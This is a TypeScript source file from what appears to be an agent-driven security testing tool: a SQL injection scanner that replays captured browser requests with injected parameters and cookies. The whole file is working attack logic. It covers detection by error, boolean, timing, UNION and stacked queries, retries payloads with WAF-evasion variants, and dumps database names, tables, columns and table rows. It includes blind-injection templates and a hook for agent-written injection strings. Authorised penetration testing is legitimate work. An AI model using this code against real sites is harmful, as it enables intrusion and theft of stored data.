// server/src/security/scanner.ts
import path from 'node:path';
import type { ExtensionConnection } from '../transport/extension-ws.js';
import { generatePayloads, generateStackedPayloads, orderByPayload, unionSelectPayload, type Payload } from './payloads/sql.js';
import { generateMutations, discoverParameters, discoverCookieParams, cookieMutation, type ScanRequest, type Mutation } from './mutator.js';
import { buildScope, isAllowed } from './scope.js';
import { analyzeErrorResponse, analyzeBooleanResponse, analyzeTimeResponse, analyzeStackedResponse, hasUnionMark } from './analyzers/sql.js';
import { snippetAround } from './analyzers/response.js';
import { tamperVariants } from './tamper.js';
import { extractDatabases, extractTables, extractColumns, dumpTable, type Injector } from './analyzers/extract.js';
import { redactScanRequest } from './redact.js';
import { FindingStore, type Finding } from './finding-store.js';
import { buildReport, saveReport, type ReportResult, type ScanReport } from './report.js';
import { manualSecurityDir } from './site.js';

export type Technique = 'error_based' | 'boolean' | 'time' | 'union' | 'stacked';

export interface ScanOptions {
  site: string;
  url?: string;
  requestId?: string;
  method?: string;
  fields?: string[];
  allowedOrigins?: string[];
  findingId?: string;
  technique?: Technique[];
  tamper?: boolean;
  extract?: 'meta' | 'structure' | 'dump' | false;
  dumpLimit?: number;
  manualBase?: string;
}

export interface ScanRunResult { report: ScanReport; findings: Finding[]; }

export class Scanner {
  private abortController: AbortController | null = null;

  constructor(private conn: ExtensionConnection) {}

  abort(): void { this.abortController?.abort(); }

  async run(opts: ScanOptions): Promise<ScanRunResult> {
    this.abortController = new AbortController();
    const signal = this.abortController.signal;
    const safeSite = opts.site.replace(/[^a-zA-Z0-9一-龥_-]/g, '_');
    const techSet = new Set(opts.technique ?? (['error_based', 'boolean', 'time', 'union', 'stacked'] as Technique[]));
    const wantExtract = opts.extract ?? 'structure';

    // 1. 构造目标请求：requestId（缓存）或 URL 直扫
    let req: ScanRequest;
    if (opts.requestId) {
      let raw: any = null;
      try { raw = await this.conn.sendRequest<any>('network_get', { requestId: opts.requestId }); } catch { raw = null; }
      if (!raw) throw new Error('Provide either url or requestId');
      req = { id: raw.id, url: raw.url, method: raw.method, headers: raw.headers ?? {}, postData: raw.postData };
    } else if (opts.url) {
      req = { id: 'direct', url: opts.url, method: opts.method ?? 'GET', headers: {}, postData: undefined };
    } else {
      throw new Error('Provide either url or requestId');
    }

    // 2. 参数 + mutations + scope
    const fields = [...(opts.fields?.length ? opts.fields : discoverParameters(req))];
    const cookieParams = discoverCookieParams(req);
    const payloads = generatePayloads();
    const errorP = payloads.filter((p) => p.category === 'error');
    const timeP = payloads.filter((p) => p.category === 'time');
    const scope = opts.allowedOrigins?.length ? buildScope('', opts.allowedOrigins) : buildScope(req.url);
    const allMutations = generateMutations(req, payloads, fields);

    const results: ReportResult[] = [];
    const baseDir = path.resolve(manualSecurityDir(safeSite, opts.manualBase));
    const store = new FindingStore(baseDir);

    // 3. 每参数判定（query/body 参数）
    const confirmedParams: { param: string; technique: string; union?: { n: number; pos: number } }[] = [];

    for (const param of fields) {
      if (signal.aborted) throw new Error('Scan aborted by user');
      const targetMutations = allMutations.filter((m) => m.parameter === param);
      if (targetMutations.length === 0) continue;
      if (!isAllowed(scope, req.url)) continue;

      const baseline = await this.replay(req, {});
      if (!baseline) { results.push(this.failedResult(req, param, 'replay failed: no response')); continue; }
      if (baseline.error) { results.push(this.failedResult(req, param, `replay failed: ${baseline.error}`)); continue; }
      const baselineBody = baseline.body;

      let confirmed = false;

      // 报错注入（含 tamper 重试）
      if (techSet.has('error_based')) {
        for (const p of errorP) {
          const m = targetMutations.find((x) => x.payload.id === p.id);
          if (!m) continue;
          let hit = await this.probeError(req, m);
          if (!hit && opts.tamper !== false) {
            // WAF 拦截重试：对 error payload 尝试 tamper 变体
            for (const tv of tamperVariants(m.payload.value)) {
              hit = await this.probeErrorValue(req, m, tv.value);
              if (hit) break;
            }
          }
          if (hit) {
            const resp = await this.replay(req, m.overrides);
            const elapsedMs = resp ? resp.elapsedMs : 0;
            results.push(this.foundResult(req, m, 'error_based', 'high', hit.body, elapsedMs, hit.pattern));
            await this.record(store, req, m.parameter, 'error_based', 'high', m.payload.value, hit.body, elapsedMs, opts.findingId);
            confirmed = true;
            break;
          }
        }
      }
      if (confirmed) { confirmedParams.push({ param, technique: 'error_based' }); continue; }

      // 布尔注入
      if (techSet.has('boolean')) {
        const truthyM = targetMutations.find((x) => x.payload.id === 'bool-true');
        const falsyM = targetMutations.find((x) => x.payload.id === 'bool-false');
        if (truthyM && falsyM) {
          const tResp = await this.replay(req, truthyM.overrides);
          const fResp = await this.replay(req, falsyM.overrides);
          if (tResp && fResp && analyzeBooleanResponse(baselineBody, tResp.body, fResp.body)) {
            results.push(this.foundResult(req, truthyM, 'boolean', 'medium', tResp.body, 0, 'boolean diff'));
            await this.record(store, req, param, 'boolean', 'medium', truthyM.payload.value, tResp.body, 0, opts.findingId);
            confirmedParams.push({ param, technique: 'boolean' });
          }
        }
      }

      // 时间盲注
      if (techSet.has('time')) {
        for (const p of timeP) {
          const m = targetMutations.find((x) => x.payload.id === p.id);
          if (!m) continue;
          const t0 = Date.now();
          const resp = await this.replay(req, m.overrides);
          const elapsedMs = Date.now() - t0;
          if (!resp) continue;
          if (analyzeTimeResponse(baseline.elapsedMs, elapsedMs)) {
            results.push(this.foundResult(req, m, 'time', 'high', resp.body, elapsedMs, `elapsed ${elapsedMs}ms`));
            await this.record(store, req, param, 'time', 'high', m.payload.value, resp.body, elapsedMs, opts.findingId);
            confirmedParams.push({ param, technique: 'time' });
            break;
          }
        }
      }

      // UNION 探测（query 参数）
      if (techSet.has('union') && req.method === 'GET') {
        const union = await this.probeUnion(req, param);
        if (union) {
          const uPayload = unionSelectPayload(union.n, union.pos);
          const uResp = await this.replay(req, { query: { [param]: uPayload.value } });
          if (uResp) {
            results.push(this.foundResult(req, { parameter: param, payload: uPayload } as any, 'union', 'high', uResp.body, uResp.elapsedMs, `union cols=${union.n} pos=${union.pos}`));
            await this.record(store, req, param, 'union', 'high', uPayload.value, uResp.body, uResp.elapsedMs, opts.findingId);
            confirmedParams.push({ param, technique: 'union', union });
          }
        }
      }

      // 堆叠注入检测
      if (techSet.has('stacked') && !confirmedParams.some((c) => c.param === param)) {
        for (const sp of generateStackedPayloads()) {
          const resp = await this.replay(req, { query: { [param]: sp.value } });
          if (resp && analyzeStackedResponse(baselineBody, resp.body)) {
            results.push(this.foundResult(req, { parameter: param, payload: sp } as any, 'stacked', 'medium', resp.body, resp.elapsedMs, 'stacked query'));
            await this.record(store, req, param, 'stacked', 'medium', sp.value, resp.body, resp.elapsedMs, opts.findingId);
            confirmedParams.push({ param, technique: 'stacked' });
            break;
          }
        }
      }
    }

    // Cookie 参数注入
    for (const cparam of cookieParams) {
      if (!isAllowed(scope, req.url)) continue;
      for (const p of errorP) {
        const m = cookieMutation(req, cparam, p);
        const hit = await this.probeError(req, m);
        if (hit) {
          results.push(this.foundResult(req, m, 'error_based', 'high', hit.body, 0, hit.pattern));
          await this.record(store, req, cparam, 'error_based', 'high', p.value, hit.body, 0, opts.findingId);
          break;
        }
      }
    }

    // 4. 提取阶段（对确认的 query 参数执行，需 union 可回显或盲注）
    if (wantExtract) {
      for (const c of confirmedParams) {
        if (!c.union) continue; // v2: 提取依赖 union 回显已知列/位置
        const inj = this.makeInjector(req, c.param, scope);
        const optsEx = { n: c.union.n, markCol: c.union.pos, dumpLimit: opts.dumpLimit ?? 20 };
        const extract: any = {};
        try {
          if (wantExtract === 'meta' || wantExtract === 'structure' || wantExtract === 'dump') {
            extract.databases = await extractDatabases(inj, optsEx);
          }
          if (wantExtract === 'structure' || wantExtract === 'dump') {
            const dbs = extract.databases ?? [];
            const db = dbs[0];
            if (db) {
              extract.tables = await extractTables(inj, db, optsEx);
              const tables = extract.tables ?? [];
              const table = tables[0];
              if (table) {
                extract.columns = await extractColumns(inj, db, table, optsEx);
                if (wantExtract === 'dump') {
                  extract.dump = { db, table, columns: extract.columns ?? [], rows: await dumpTable(inj, db, table, extract.columns ?? [], optsEx) };
                }
              }
            }
          }
        } catch {}
        if (Object.keys(extract).length > 0) {
          const result = results.find((r) => r.parameter === c.param);
          if (result) (result as any).extract = extract;
        }
      }
    }

    // 5. 报告 + 落盘
    const report = buildReport(safeSite, req.url, fields, scope.allowedOrigins, results);
    await saveReport(safeSite, report, opts.manualBase);
    const findings = await store.list();
    return { report, findings };
  }

  /** 自定义 payload 探测：Agent 直接写 SQL 注入语句，自动判定 + 可选提取 */
  async requestProbe(opts: {
    site: string; url?: string; requestId?: string; method?: string;
    param: string; payload: string;
    allowedOrigins?: string[]; findingId?: string;
    extract?: 'meta' | 'structure' | 'dump' | false;
    dumpLimit?: number; manualBase?: string;
  }): Promise<Record<string, unknown>> {
    const safeSite = opts.site.replace(/[^a-zA-Z0-9一-龥_-]/g, '_');
    let req: ScanRequest;
    if (opts.requestId) {
      let raw: any = null;
      try { raw = await this.conn.sendRequest<any>('network_get', { requestId: opts.requestId }); } catch { raw = null; }
      if (!raw) throw new Error('requestId not found');
      req = { id: raw.id, url: raw.url, method: raw.method, headers: raw.headers ?? {}, postData: raw.postData };
    } else if (opts.url) {
      req = { id: 'direct', url: opts.url, method: opts.method ?? 'GET', headers: {}, postData: undefined };
    } else {
      throw new Error('Provide either url or requestId');
    }
    const scope = opts.allowedOrigins?.length ? buildScope('', opts.allowedOrigins) : buildScope(req.url);
    if (!isAllowed(scope, req.url)) throw new Error('Target out of scope');

    const baseline = await this.replay(req, {});
    if (!baseline || baseline.error) throw new Error('Baseline request failed');

    const t0 = Date.now();
    const resp = await this.replay(req, { query: { [opts.param]: opts.payload } });
    const elapsedMs = Date.now() - t0;
    if (!resp || resp.error) return { hit: false, error: 'replay failed' };

    // 自动判定
    let technique: string | undefined;
    let confidence: string | undefined;
    const errHit = analyzeErrorResponse(resp.body);
    if (errHit) { technique = 'error_based'; confidence = 'high'; }
    else if (hasUnionMark(resp.body)) { technique = 'union'; confidence = 'high'; }
    else if (/(sleep|pg_sleep|waitfor)/i.test(opts.payload) && analyzeTimeResponse(baseline.elapsedMs, elapsedMs)) { technique = 'time'; confidence = 'high'; }
    else if (analyzeBooleanResponse(baseline.body, resp.body, baseline.body)) { technique = 'boolean'; confidence = 'medium'; }
    const hit = !!technique;

    // 落盘 finding
    let finding: unknown;
    if (hit) {
      const store = new FindingStore(path.resolve(manualSecurityDir(safeSite, opts.manualBase)));
      await this.record(store, req, opts.param, technique!, confidence!, opts.payload, resp.body, elapsedMs, opts.findingId);
      finding = (await store.list()).find((f) => f.parameter === opts.param);
    }

    // 可选提取（盲注模板）
    let extract: unknown;
    if (hit && opts.extract) {
      const injBlind: Injector = {
        ...this.makeInjector(req, opts.param, scope),
        unionQuery: async () => null, // 强制盲注（自定义 payload 场景列数未知）
      };
      const optsEx = { n: 0, markCol: 0, dumpLimit: opts.dumpLimit ?? 20 };
      extract = await this.extractWithBlind(injBlind, opts.extract, optsEx);
    }

    return {
      hit, technique, confidence,
      evidence: { payload: opts.payload, response_snippet: resp.body.slice(0, 200), elapsed_ms: elapsedMs },
      extract, finding,
    };
  }

  private async extractWithBlind(inj: Injector, depth: string, optsEx: { n: number; markCol: number; dumpLimit: number }): Promise<Record<string, unknown>> {
    const extract: Record<string, unknown> = {};
    if (depth === 'meta' || depth === 'structure' || depth === 'dump') {
      extract.databases = await extractDatabases(inj, optsEx);
    }
    if (depth === 'structure' || depth === 'dump') {
      const db = (extract.databases as string[] | undefined)?.[0];
      if (db) {
        extract.tables = await extractTables(inj, db, optsEx);
        const table = (extract.tables as string[] | undefined)?.[0];
        if (table) {
          extract.columns = await extractColumns(inj, db, table, optsEx);
          if (depth === 'dump') {
            extract.dump = { db, table, columns: extract.columns, rows: await dumpTable(inj, db, table, (extract.columns as string[]) ?? [], optsEx) };
          }
        }
      }
    }
    return extract;
  }

  // ---- 执行通道 ----

  private async replay(req: ScanRequest, overrides: Record<string, any>): Promise<{ body: string; elapsedMs: number; error?: string } | null> {
    if (this.abortController?.signal.aborted) throw new Error('Scan aborted by user');
    try {
      const t0 = Date.now();
      const resp = req.id === 'direct'
        ? await this.conn.sendRequest<any>('http_request', { url: req.url, method: req.method, query: overrides?.query, body: overrides?.body, cookie: overrides?.cookie })
        : await this.conn.sendRequest<any>('network_replay_browser', { requestId: req.id, overrides });
      const elapsedMs = Date.now() - t0;
      if (resp?.error) return { body: '', elapsedMs, error: resp.error };
      return { body: typeof resp?.body === 'string' ? resp.body : '', elapsedMs };
    } catch (err: any) {
      return { body: '', elapsedMs: 0, error: String(err?.message ?? err) };
    }
  }

  private async probeError(req: ScanRequest, m: Mutation): Promise<{ body: string; pattern: string } | null> {
    const resp = await this.replay(req, m.overrides);
    if (!resp || resp.error) return null;
    const hit = analyzeErrorResponse(resp.body);
    return hit ? { body: resp.body, pattern: hit.pattern } : null;
  }

  private async probeErrorValue(req: ScanRequest, m: Mutation, value: string): Promise<{ body: string; pattern: string } | null> {
    const overrides = { ...m.overrides };
    if (overrides.query) overrides.query = { [Object.keys(overrides.query)[0]]: value };
    if (overrides.body && typeof overrides.body === 'object') {
      const key = Object.keys(overrides.body as object)[0];
      overrides.body = { ...(overrides.body as object), [key]: value };
    }
    const resp = await this.replay(req, overrides);
    if (!resp || resp.error) return null;
    const hit = analyzeErrorResponse(resp.body);
    return hit ? { body: resp.body, pattern: hit.pattern } : null;
  }

  /** UNION 探测：ORDER BY 列数 → 各列回显匹配 */
  private async probeUnion(req: ScanRequest, param: string): Promise<{ n: number; pos: number } | null> {
    let n = 0;
    for (let i = 1; i <= 20; i++) {
      const resp = await this.replay(req, { query: { [param]: orderByPayload(i).value } });
      if (!resp || resp.error) return null;
      if (analyzeErrorResponse(resp.body)) { n = i - 1; break; }
    }
    if (n <= 0) return null;
    for (let pos = 1; pos <= n; pos++) {
      const resp = await this.replay(req, { query: { [param]: unionSelectPayload(n, pos).value } });
      if (resp && !resp.error && hasUnionMark(resp.body)) return { n, pos };
    }
    return null;
  }

  /** 提取注入器：query 参数通道 */
  private makeInjector(req: ScanRequest, param: string, scope: { allowedOrigins: string[] }): Injector {
    const self = this;
    const q = (v: string) => ({ query: { [param]: v } });
    return {
      async unionQuery(payload) {
        if (!isAllowed(scope, req.url)) return null;
        const resp = await self.replay(req, q(payload));
        return resp && !resp.error ? resp.body : null;
      },
      async blindBoolean(cond) {
        const truthy = await self.replay(req, q(`1' AND (${cond})-- `));
        const falsy = await self.replay(req, q(`1' AND (0)-- `));
        return !!(truthy && falsy && analyzeBooleanResponse(falsy.body, truthy.body, falsy.body));
      },
      async blindTime(cond) {
        const t0 = Date.now();
        await self.replay(req, q(`1' AND IF((${cond}),SLEEP(2),0)-- `));
        return Date.now() - t0 > 2000;
      },
    };
  }

  // ---- 记录与报告 ----

  private async record(store: FindingStore, req: ScanRequest, param: string, technique: string, confidence: string, payload: string, body: string, elapsedMs: number, findingId?: string): Promise<void> {
    const redacted = redactScanRequest(req);
    const validation = {
      technique, confidence,
      evidence: { payload, request: redacted, response_snippet: snippetAround(body, 'SQL', 60), elapsed_ms: elapsedMs },
      at: new Date().toISOString(),
    };
    const f = await store.upsert({
      url: req.url, method: req.method, parameter: param,
      confidence: confidence === 'high' ? 0.9 : 0.7,
      matchedRules: [technique],
      validation,
    });
    if (f.status === 'SUSPECT') {
      try { await store.updateStatus(f.id, 'VALIDATED'); } catch {}
    }
    if (findingId) {
      try { await store.updateStatus(findingId, 'VALIDATED'); } catch (err: any) { console.error('[scanner]', err?.message); }
    }
  }

  private foundResult(req: ScanRequest, m: any, technique: string, confidence: string, body: string, elapsedMs: number, note: string): ReportResult {
    const redacted = redactScanRequest(req);
    return {
      url: redacted.url, method: redacted.method, parameter: m.parameter,
      technique, confidence: confidence as 'high' | 'medium',
      evidence: {
        payload: m.payload.value,
        request: { method: redacted.method, url: redacted.url, headers: redacted.headers, body: redacted.body },
        response_snippet: snippetAround(body, note.split(' ')[0], 60) || body.slice(0, 200),
        elapsed_ms: elapsedMs,
      },
      credentials: { redacted: true },
      suggestion: '使用参数化查询/预编译语句；对输入做白名单校验',
      status: 'found',
    };
  }

  private failedResult(req: ScanRequest, param: string, reason?: string): ReportResult {
    const redacted = redactScanRequest(req);
    return {
      url: redacted.url, method: redacted.method, parameter: param,
      technique: 'unknown', confidence: 'low',
      evidence: { payload: '', request: {}, response_snippet: reason || 'replay failed', elapsed_ms: 0 },
      credentials: { redacted: true }, suggestion: '', status: 'failed',
    };
  }
}
